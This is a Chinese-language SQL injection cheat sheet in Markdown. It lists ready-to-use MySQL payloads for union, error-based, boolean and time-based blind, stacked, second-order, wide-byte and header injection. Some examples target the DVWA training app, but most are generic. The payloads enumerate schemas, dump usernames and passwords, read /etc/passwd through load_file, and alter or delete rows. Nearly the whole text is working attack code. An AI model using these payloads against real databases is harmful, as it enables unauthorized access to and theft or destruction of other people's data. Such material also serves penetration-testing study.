## 联合注入：
```sql
select user,password from users where user_id=1 union select 1,2;
select * from users where user_id = 1 union select * from users where user_id = 2 ;
```
字符型注入dvwa
```sql
1' or '1234'=1234
1' or 'abcd' = 'abcd'
1' or 1=1 order by 1 //猜测字段
select * from users order by password ;
1' or 1=1 order by 2 #
1' or 1=1 order by 3 #
1' union select 1,database() #
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() //获取数据库中的表
select group_concat(user) from users where user_id=1 or user_id=2;
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' //获取表字段名
1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users
{
id=-1 union select 1,2,3,database(),5,6,7,8
(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),5,6,7,8
(select column_name from information_schema.columns where table_schema='dvwa'  and table_name='users' limit 4,1)
(select password from dvwa.users limit 0,1),(select user from dvwa.users limit 0,1)
}
```

##报错注入：

floor函数
```sql
1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  //爆数据库
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) //爆表
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=表名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  //爆字段
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user_id,0x3a,password,0x23) FROM user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  //爆内容
```

UPDATEXML函数
```sql
1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
(0x7e,(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),0x7e)
' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --+
```

几何函数报错
```sql
1' and geometrycollection((select * from(select * from(select user())a)b));
1' and multipoint((select * from(select * from(select user())a)b));
1' and polygon((select * from(select * from(select user())a)b));
1' and multipolygon((select * from(select * from(select user())a)b));
1' and linestring((select * from(select * from(select user())a)b));
1' and multilinestring((select * from(select * from(select user())a)b));
```

exp
```sql
1' and exp(~(select * from(select user())a));
select ~0 //将0取反，函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。
MySql5.5.5版本后整形溢出才会报错
得到表名：
select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
得到列名：
select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));
检索数据：
select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));
insert into users (id, username, password) values (2, '' or !(select*from(select user())x)-~0 or '', 'Eyre');
select exp(~(select*from(select load_file('/etc/passwd'))a));读取本地文件
insert into users (id, username, password) values (2, '' or !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0 or '', 'Eyre');

update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4;

delete from users where id='1' or !(select*from(select user())x)-~0 or '';
```

Extractvalue
```sql
?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
```

NAME_CONST
```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

## 盲注：
布尔
```sql
1' and left(database(),4)='dvwa' --+
1' and mid(database(),1,1)='d' --+
1' and ascii(mid(database(),1,1))='100'--+
1' and length(database())>=5--+判断库名长度
1' and substr(database(),1,1)='d'--+ 截取库名第一个字符
1 and 1=(if((user() regexp '^r'),1,0)) --+
1 and 1=(user() like 'r%25') --+
```

## 延迟注入：

SLEEP函数
```sql
1' and if(length(database())>=4,sleep(5),1)--+
1' and if(ascii(mid(database(),1,1))='100',sleep(5),1)--+
1 and (select sleep(10) from dual where database() like '%')#
1 and (select sleep(10) from dual where database() like '___')#
1 and (select sleep(10) from dual where database() like '_____')#
1 and (select sleep(10) from dual where database() like 'a____')#
1 and (select sleep(10) from dual where database() like 's____')#
1 and (select sleep(10) from dual where database() like 'sa___')#
1 and (select sleep(10) from dual where database() like 'swa__')#
1 and (select sleep(10) from dual where database() like 'swb__')#
1 and (select sleep(10) from dual where database() like 'swi__')#
1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#

BENCHMARK
```sql
Select * from users where user_id= 1 and (if(ascii(substr(database(),1,1))=100,benchmark(100000000,sha(1)), null));
```

笛卡尔积
```sql
将两个大表做乘积。现在，我们有两个集合A和B。
A = {0,1}     B = {2,3,4}
集合 A×B 和 B×A的结果集就可以分别表示为以下这种形式：
A×B = {（0，2），（1，2），（0，3），（1，3），（0，4），（1，4）}；
B×A = {（2，0），（2，1），（3，0），（3，1），（4，0），（4，1）}；
数据库表连接数据行匹配时所遵循的算法就是以上提到的笛卡尔积，表与表之间的连接可以看成是在做乘法运算
select * from guestbook join users
```

Get_lock
```sql
Select GET_LOCK('snowwolf',10)
```

Rlike
```sql
select concat (rpad (1,999999,a),rpad (1,999999,a),rpad(1,999999,a) ,rpad(1,999999,a)
,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a)
,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rp
ad(1,999999,a) ,rpad (1,999999,a),rpad(1,999999,a),rpad(1,999999,a )) RLIKE '(a.*)+(a.*)+
(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b';
```

## 堆叠查询：
```sql
;select
```

## 二阶注入：

注册或更新个人资料如下
```sql
I love programming', email=(SELECT email FROM users WHERE username='admin') --
```
当执行SQL语句时，会发生以下情况：
```bash
末尾的注释--可确保原始 SQL 查询的其余部分被注释掉
子查询(SELECT email FROM users WHERE username='admin'）将执行用管理员用户的电子邮件替换该列
```

## 宽字节注入：
```sql
%bf%27
%df%5c
%A8%27
```

## HTTP请求头注入：
```sql
User-Agent
Cookie
Referer
X-Forward-For
```
